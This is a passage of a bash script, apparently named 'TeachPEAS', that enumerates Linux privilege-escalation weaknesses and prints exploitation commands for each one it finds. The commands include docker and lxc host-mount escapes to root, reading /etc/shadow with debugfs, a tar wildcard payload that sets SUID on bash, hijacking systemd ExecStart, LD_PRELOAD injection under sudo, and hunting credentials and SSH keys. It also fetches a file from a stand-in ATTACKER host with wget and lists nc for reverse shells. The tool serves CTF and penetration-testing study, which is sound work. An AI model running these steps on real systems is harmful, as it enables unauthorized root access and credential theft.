        "Steps:\n  1. Find writable directory in PATH\n  2. Identify SUID binary that calls relative commands: strings /path/to/suid | grep -v '/'\n  3. Create malicious version: echo '/bin/sh' > /writable/path/command; chmod +x\n  4. Execute SUID binary"
    
    local writable_path=0
    
    info "Current PATH: $PATH"
    
    echo "$PATH" | tr ':' '\n' | while read dir; do
        if [ -w "$dir" ]; then
            critical "Writable PATH directory: $dir - Hijack commands for privilege escalation"
            vuln "Writable directory in PATH: $dir"
            writable_path=1
            teach "You can create fake binaries here. They'll be executed by:"
            teach "  • SUID binaries calling system commands"
            teach "  • Sudo commands using relative paths"
            teach "  • Root cron jobs with simple PATH"
            teach "  • Other users' scripts"
            
            teach "Common targets to hijack: ls, cat, whoami, id, ps, netstat"
        fi
    done
    
    [ $writable_path -eq 0 ] && ok "No writable directories in PATH"
    
    # Check if current directory is in PATH
    if echo "$PATH" | grep -qE '(^|:)\.(:$|$)'; then
        critical "Current directory (.) in PATH - Extreme hijacking risk"
        vuln "Current directory (.) is in PATH!"
        teach "Extremely dangerous - any command can be hijacked"
    fi
}

# === SPECIAL GROUPS ===
enum_groups() {
    section "PRIVILEGED GROUP MEMBERSHIP"
    
    explain_concept "Special Groups" \
        "Certain Linux groups grant powerful capabilities. Membership in these groups can be equivalent to root access." \
        "Groups exist to delegate specific privileges. Docker group = control containers as root. Disk group = read any file. LXD group = create privileged containers. Admins add users for convenience, not realizing the security implications." \
        "Dangerous groups and exploitation:\n  • docker: Mount host filesystem in container\n  • lxd/lxc: Create privileged container\n  • disk: Direct disk access bypasses permissions\n  • video: Capture framebuffer screenshots\n  • sudo: Obvious, but check for NOPASSWD"
    
    local current_groups=$(id | grep -oE 'groups=[^)]+' | cut -d= -f2)
    info "Your groups: $current_groups"
    
    # Check for docker group
    if echo "$current_groups" | grep -qw "docker"; then
        critical "DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
        vuln "You are in the DOCKER group!"
        explain_concept "Docker Group Exploitation" \
            "Docker daemon runs as root. Docker group members can execute commands inside containers that run as root and can mount the host filesystem." \
            "This is by design - Docker needs root to manage containers. The security issue is that Docker group = root equivalent, but admins don't realize this when adding users." \
            "Exploitation:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash\n  This:\n    1. Mounts entire host filesystem to /mnt in container\n    2. chroot into /mnt (now you're in host filesystem)\n    3. Running as root inside container = root on host\n  Alternative: docker run -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow"
    fi
    
    # Check for lxd/lxc group
    if echo "$current_groups" | grep -qE "lxd|lxc"; then
        critical "LXD/LXC GROUP - Create privileged container for root access"
        vuln "You are in the LXD/LXC group!"
        explain_concept "LXD Group Exploitation" \
            "LXD manages Linux containers. Group members can create privileged containers with security.privileged=true, which disables most isolation." \
            "Similar to Docker - container management needs root. Privileged containers can access host resources directly, including mounting host filesystem with no restrictions." \
            "Exploitation:\n  lxc init ubuntu:18.04 privesc -c security.privileged=true\n  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n  lxc start privesc\n  lxc exec privesc /bin/bash\n  cd /mnt/root/root"
        
        teach "Alternative method if no internet for image download:"
        teach "  1. Build minimal Alpine image on your machine"
        teach "  2. Transfer to target: python3 -m http.server (on attacker)"
        teach "  3. wget http://ATTACKER/alpine.tar.gz"
        teach "  4. lxc image import alpine.tar.gz --alias privesc"
        teach "  5. Follow exploitation steps above"
    fi
    
    # Check for disk group
    if echo "$current_groups" | grep -qw "disk"; then
        critical "DISK GROUP - Read any file: debugfs /dev/sda1"
        vuln "You are in the DISK group!"
        explain_concept "Disk Group Exploitation" \
            "Disk group grants direct access to block devices (/dev/sda, etc). This bypasses all filesystem permissions." \
            "The disk group exists for disk management utilities. Direct disk access means you can read raw disk sectors, bypassing Linux permission checks entirely." \
            "Exploitation:\n  debugfs /dev/sda1 (interactive disk editor)\n  debugfs: cat /etc/shadow\n  Or: dd if=/dev/sda of=/tmp/disk.img (copy entire disk)\n  Or: Use debugfs to read /root/.ssh/id_rsa"
    fi
    
    # Check for video group
    if echo "$current_groups" | grep -qw "video"; then
        warn "You are in the VIDEO group"
        teach "Video group can access framebuffer devices"
        teach "  Capture screenshots of root user sessions: cat /dev/fb0 > screenshot.raw"
        teach "  May reveal passwords being typed, sensitive information"
    fi
    
    # Check for adm group
    if echo "$current_groups" | grep -qw "adm"; then
        info "You are in the ADM group"
        teach "Adm group can read most log files in /var/log"
        teach "  Useful for password hunting, finding misconfigurations"
        teach "  Check auth.log, apache logs, application logs for secrets"
    fi
}

# === NFS EXPORTS ===
enum_nfs() {
    section "NFS EXPORT ANALYSIS"
    
    if [ ! -f /etc/exports ]; then
        ok "No NFS exports configured"
        return
    fi
    
    explain_concept "NFS no_root_squash" \
        "NFS (Network File System) shares directories over network. 'no_root_squash' means root on client = root on server." \
        "By default, NFS 'squashes' root UID to nobody for security. But 'no_root_squash' disables this. If you can mount the share, you can create files as root on the server." \
        "Exploitation:\n  1. Mount the NFS share: mount -t nfs server:/share /mnt\n  2. Create SUID binary: cp /bin/bash /mnt/bash; chmod +s /mnt/bash\n  3. On server, this bash is now SUID root\n  4. Execute: /share/bash -p"
    
    grep -v "^#" /etc/exports 2>/dev/null | grep -v "^$" | while read line; do
        info "NFS export: $line"
        
        if echo "$line" | grep -q "no_root_squash"; then
            critical "NFS no_root_squash - Mount from another machine as root"
            vuln "NFS export has 'no_root_squash': $line"
            teach "If you can access this from another machine as root, you gain root on this system"
        fi
        
        if echo "$line" | grep -qE "rw|no_all_squash"; then
            warn "NFS export is writable or doesn't squash all UIDs"
        fi
    done
}

# === CONTAINER ESCAPE ===
enum_container() {
    section "CONTAINER DETECTION & ESCAPE"
    
    explain_concept "Container Environments" \
        "Containers isolate processes but share the host kernel. Misconfigurations or vulnerabilities can allow escape to host." \
        "Containers use namespaces and cgroups for isolation. If privileged, mounted with host volumes, or on vulnerable Docker, you may escape. Containers are NOT VMs - same kernel as host." \
        "Common escape vectors:\n  • Privileged container (--privileged flag)\n  • Docker socket mounted inside\n  • Host filesystem mounted\n  • Kernel exploits (affects host)\n  • CAP_SYS_ADMIN capability"
    
    # Check if running in container
    if [ -f /.dockerenv ]; then
        warn "Running inside a DOCKER container"
        
        # Check if privileged
        if ip link add dummy0 type dummy 2>/dev/null; then
            ip link delete dummy0 2>/dev/null
            critical "PRIVILEGED CONTAINER - Mount host: mount /dev/sda1 /mnt then chroot /mnt"
            vuln "Container is PRIVILEGED!"
            explain_concept "Privileged Container Escape" \
                "Privileged containers have almost all capabilities and can access host devices." \
                "The --privileged flag disables most security features. It's used for nested Docker, device access, etc. But it allows mounting host filesystem and accessing host resources." \
                "Exploitation:\n  mkdir /tmp/hostfs\n  mount /dev/sda1 /tmp/hostfs\n  chroot /tmp/hostfs\n  Now you're on the host filesystem as root"
        fi
        
        # Check for Docker socket
        if [ -S /var/run/docker.sock ]; then
            critical "Docker socket in container - Control host Docker daemon"
            vuln "Docker socket is mounted inside container!"
            teach "You can control the Docker daemon from inside the container"
            teach "  Create new privileged container and escape"
        fi
        
        # Check for suspicious mounts
        if mount | grep -q "/ type.*rw"; then
            warn "Root filesystem might be mounted from host"
        fi
        
    elif [ -d /proc/vz ]; then
        info "Running in OpenVZ container"
    elif grep -q "lxc" /proc/1/cgroup 2>/dev/null; then
        warn "Running in LXC container"
    else
        ok "Not in a detected container environment"
    fi
}

# === SYSTEMD ANALYSIS ===
enum_systemd() {
    section "SYSTEMD SERVICE ANALYSIS"
    
    explain_concept "Systemd Services" \
        "Systemd manages system services. Writable service files or misconfigured services running as root can be exploited." \
        "Systemd replaced init scripts. Services defined in .service files specify what runs, as which user, and when. If you can modify a service file that runs as root, you control what root executes on boot or service restart." \
        "Attack vectors:\n  • Writable .service file\n  • Service executes writable script\n  • Service uses relative paths\n  • Service has weak permissions"
    
    # Check for writable service files (must be actually writable, not just symlinks)
    find /etc/systemd/system /lib/systemd/system -name "*.service" -type f -writable 2>/dev/null | while read service; do
        # Double-check it's actually writable (not just a symlink artifact)
        if [ -w "$service" ] && [ ! -L "$service" ]; then
            critical "Writable systemd service: $service - Modify ExecStart for root execution"
            vuln "Writable systemd service: $service"
            teach "Modify this service to run your code as root on next start"
            teach "  Add: ExecStart=/bin/bash /tmp/evil.sh"
            teach "  Then: systemctl daemon-reload; systemctl restart \$(basename $service)"
        fi
    done
    
    # Check for services with writable executables
    find /etc/systemd/system /lib/systemd/system -name "*.service" 2>/dev/null | while read service; do
        grep "^ExecStart=" "$service" 2>/dev/null | while read line; do
            local exec_path=$(echo "$line" | sed 's/ExecStart=//' | awk '{print $1}')
            if [ -n "$exec_path" ] && [ -w "$exec_path" ]; then
                vuln "Service $service executes writable file: $exec_path"
            fi
        done
    done
}

# === ENVIRONMENT VARIABLES ===
enum_env() {
    section "ENVIRONMENT VARIABLE ANALYSIS"
    
    explain_concept "Environment Variables" \
        "Environment variables can influence program behavior. LD_PRELOAD, LD_LIBRARY_PATH, and PYTHONPATH can be exploited if preserved through sudo." \
        "Programs load libraries at runtime. LD_PRELOAD forces a library to load first. If sudo preserves this variable (env_keep+=LD_PRELOAD), you can inject code into any sudo command." \
        "Exploitation:\n  1. Create malicious library with init function\n  2. Compile: gcc -shared -fPIC -o evil.so evil.c\n  3. Set: export LD_PRELOAD=/tmp/evil.so\n  4. Run: sudo <any command>\n  5. Your library's code runs as root"
    
    # Check current environment
    if env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH" | grep -qv "^$"; then
        warn "LD_* variables are set in environment:"
        env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH"
    fi
    
    # Check if sudo preserves env
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
        critical "Sudo preserves LD_PRELOAD - Inject malicious library for instant root"
        vuln "Sudo preserves LD_PRELOAD!"
        teach "Create malicious shared library and execute with any sudo command"
    fi
    
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_LIBRARY_PATH"; then
        vuln "Sudo preserves LD_LIBRARY_PATH!"
        teach "Similar to LD_PRELOAD but points to directory containing evil library"
    fi
}

# === PASSWORD & HASH HUNTING ===
enum_passwords() {
    section "PASSWORD & CREDENTIAL HUNTING"
    
    explain_concept "Credential Hunting" \
        "Passwords and keys are often stored insecurely in config files, scripts, history files, and environment variables." \
        "Developers hardcode credentials for convenience. Admins store passwords in scripts. Users type them in commands. All leave traces. Finding one password often leads to privilege escalation or lateral movement." \
        "Where to look:\n  • .bash_history, .zsh_history\n  • Config files: *.conf, *.config, *.ini\n  • Scripts: *.sh, *.py, *.pl\n  • Database dumps, backup files\n  • Environment variables\n  • /var/www, application configs"
    
    # Check history files
    for histfile in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history; do
        if [ -r "$histfile" ]; then
            if grep -iE "password|passwd|pwd|secret|token|key" "$histfile" 2>/dev/null | head -3 | grep -q "."; then
                warn "Found password-related entries in $histfile"
                grep -iE "password|passwd|pwd|secret" "$histfile" 2>/dev/null | head -3 | while read line; do
                    log "  $line"
                done
            fi
        fi
    done
    
    # Check common config locations
    info "Checking common credential locations..."
    
    local cred_locations=(
        "/var/www/html/wp-config.php"
        "/var/www/html/config.php"
        "/.env"
        "/opt/*/config*"
        "/home/*/.config/*"
    )
    
    for pattern in "${cred_locations[@]}"; do
        find $(dirname "$pattern") -name "$(basename "$pattern")" 2>/dev/null | head -5 | while read file; do
            if grep -iE "password|secret|key|token" "$file" 2>/dev/null | head -1 | grep -q "."; then
                warn "Credentials found in: $file"
            fi
        done
    done
    
    # Check for SSH keys
    find /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | while read key; do
        if [ -r "$key" ]; then
            critical "Readable SSH private key: $key - Use for lateral movement"
            warn "Readable SSH private key: $key"
            teach "Try this key for SSH access: ssh -i $key user@target"
        fi
    done
}

# === INTERESTING FILES ===
enum_interesting_files() {
    section "INTERESTING FILE DISCOVERY"
    
    teach "Looking for unusual or interesting files that might contain flags, credentials, or other useful information..."
    
    # SUID/SGID files in unusual locations
    info "SUID/SGID files in non-standard locations:"
    find /home /tmp /var /opt -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -10 | while read file; do
        warn "  $file"
    done
    
    # Recently modified files
    info "Recently modified files (last 24 hours) in sensitive locations:"
    find /etc /root -type f -mtime -1 2>/dev/null | head -10 | while read file; do
        log "  $file"
    done
    
    # Files with passwords in name
    info "Files with 'password' in name:"
    find / -name "*password*" -o -name "*passwd*" 2>/dev/null | head -10 | while read file; do
        [ -r "$file" ] && log "  $file"
    done
    
    # Backup files
    info "Backup files that might contain credentials:"
    find /var/backups /home -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -10 | while read file; do
        [ -r "$file" ] && log "  $file"
    done
}

# === TOOLS AVAILABILITY ===
enum_tools() {
    section "INSTALLED TOOLS & COMPILERS"
    
    teach "Available tools affect exploitation options. Compilers let you build exploits. Network tools enable pivoting."
    
    local tools=(
        "gcc:Compile C exploits"
        "g++:Compile C++ exploits"
        "python:Run exploit scripts and pty shells"
        "python3:Modern Python exploits"
        "perl:Run Perl exploits"
        "ruby:Run Ruby exploits"
        "wget:Download exploits and tools"
        "curl:Download files and interact with APIs"
        "nc:Netcat for reverse shells"
        "ncat:Modern netcat with SSL support"
        "socat:Advanced socket relay tool"
        "nmap:Port scanning and service detection"
        "tcpdump:Packet capture for network analysis"
        "git:Clone exploit repositories"
        "docker:Container management (check group!)"
        "kubectl:Kubernetes control (if in cluster)"
    )
    
    for tool_desc in "${tools[@]}"; do
        local tool=$(echo "$tool_desc" | cut -d: -f1)
        local desc=$(echo "$tool_desc" | cut -d: -f2)
        
        if command -v "$tool" >/dev/null 2>&1; then
            info "✓ $tool - $desc"
        fi
    done
    
    # Check for language interpreters
    if command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
        teach "Python available - use for pty shells: python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    fi
}

# === WILDCARD INJECTION ===
enum_wildcards() {
    section "WILDCARD INJECTION OPPORTUNITIES"
    
    explain_concept "Wildcard Injection" \
        "When scripts use wildcards (*, ?) with commands, specially named files can be interpreted as command arguments." \
        "Shell expands wildcards before passing to command. If script does 'tar -czf backup.tar.gz *', files named '--checkpoint=1' become arguments to tar. Commands process arguments before files." \
        "Common targets:\n  • tar with * → --checkpoint-action\n  • rsync with * → -e option\n  • chown with * → --reference\n  • Any command taking options starting with -"
    
    # Look for scripts using wildcards
    find /var/scripts /usr/local/bin /opt -name "*.sh" -readable 2>/dev/null | while read script; do
        if grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | grep -q "."; then
            warn "Script uses wildcards: $script"
            grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | while read line; do
                log "  $line"
            done
            
            teach "Exploitation example for tar:"
            teach "  echo '#!/bin/sh' > shell.sh"
            teach "  echo 'chmod u+s /bin/bash' >> shell.sh"
            teach "  chmod +x shell.sh"
            teach "  touch -- '--checkpoint=1'"
            teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
        fi
    done
}

# === MAIN EXECUTION ===
main() {
    log "${G}╔═══════════════════════════════════════╗${RST}"
    log "${G}║         TeachPEAS - Red Team Bible           ║${RST}"
    log "${G}║   Comprehensive Privilege Escalation Guide   ║${RST}"
    log "${G}╚═══════════════════════════════════════╝${RST}"
    log ""
    log "${Y}Purpose: Enumerate + Educate${RST}"
    log "${Y}Every finding includes WHY and HOW${RST}"
    log ""
    log "Logging to: $LOG_FILE"
    log "Started: $(date)"
    log ""
    
    # Core enumeration
    enum_system
    enum_network
    enum_users
    enum_processes
    enum_mail_logs
    
    # Permission-based vectors
    enum_sudo
    enum_suid
    enum_sgid
    enum_writable_files
    enum_capabilities
    
    # Group-based vectors
    enum_groups
    
    # Service-based vectors
    enum_cron
    enum_systemd
    
    # Kernel & container
    enum_kernel
    enum_kernel_modules
    enum_container
    enum_mac
    
    # Path & environment
    enum_path
    enum_env
    
    # File system
    enum_nfs
    enum_wildcards
    enum_backups
    enum_mounts
    enum_world_writable
    
    # Credential hunting
    enum_passwords
    enum_interesting_files
    
    # Tools
    enum_tools
    enum_scheduled
    enum_clipboard
    
    # Extended modules (optional)
    if [ $EXTENDED -eq 1 ]; then
        log ""
        log "${P}═══════════════════════════════════════${RST}"
        log "${P}    EXTENDED ENUMERATION MODULES${RST}"
        log "${P}═══════════════════════════════════════${RST}"
        
        # Phase 1: High-value additions
        enum_cloud_metadata
        enum_language_creds
        enum_databases_extended
        enum_cicd
        
        # Original extended modules
        enum_databases
        enum_web
        enum_post_exploit
        enum_ctf_flags
        enum_pivoting
    fi
    
    # Critical findings summary
    if grep -q "CRITICAL" "$LOG_FILE"; then
        section "⚠️  CRITICAL FINDINGS SUMMARY"
        log "${CRIT}Found instant privilege escalation opportunities:${RST}"
        log ""
        grep "CRITICAL" "$LOG_FILE" | while read line; do
            log "$line"
        done
        log ""
    fi
    
    section "ENUMERATION COMPLETE"
    log "${Y}═══════════════════════════════════════${RST}"
    log "${Y}NEXT STEPS:${RST}"
    log "1. Review all ${CRIT}CRITICAL${RST} findings above for instant wins"
    log "2. Review all VULNERABLE findings"
    log "3. Read the LEARN sections to understand each vulnerability"
    log "4. Test exploits manually (don't just run automated tools)"
    log "5. Document what you learn for future reference"
    log ""
    log "${Y}EDUCATIONAL GOALS:${RST}"
    log "• Recognize these patterns on other systems"
    log "• Understand Linux security model deeply"
    log "• Know what to look for during initial access"
    log "• Build mental models, not just command lists"
    log ""
    log "${G}Full enumeration log: $LOG_FILE${RST}"
    log "Run completed: $(date)"
}

# Parse arguments
while [ $# -gt 0 ]; do
    case "$1" in
        -q|--quick)
            QUICK_MODE=1
            shift
            ;;
        -e|--extended)
            EXTENDED=1
            shift
            ;;
        -v|--verbose)
            VERBOSE=1
            shift
            ;;
        --no-explain)
            EXPLAIN=0
            shift
            ;;
        -h|--help)
            echo "TeachPEAS - Educational Privilege Escalation Enumeration"
            echo ""
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  -q, --quick      Quick scan (skip some slow checks)"
            echo "  -e, --extended   Enable extended modules (databases, web, post-exploit, CTF flags)"
            echo "  -v, --verbose    Verbose output"
            echo "  --no-explain     Skip educational explanations"
            echo "  -h, --help       Show this help"
            echo ""
            echo "Extended modules include:"
            echo "  • Cloud metadata enumeration (AWS/Azure/GCP)"
            echo "  • Language-specific credential discovery (.env, package.json, etc.)"
            echo "  • Database enumeration (MySQL, PostgreSQL, Redis, MongoDB)"
            echo "  • Web application analysis (config files, writable web roots)"
            echo "  • CI/CD secret exposure (Git, Jenkins, GitLab)"
            echo "  • Post-exploitation techniques (persistence, lateral movement)"
            echo "  • CTF flag hunting (common patterns and locations)"
            echo "  • Network pivoting setup (SSH tunneling, internal networks)"
            echo ""
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

main
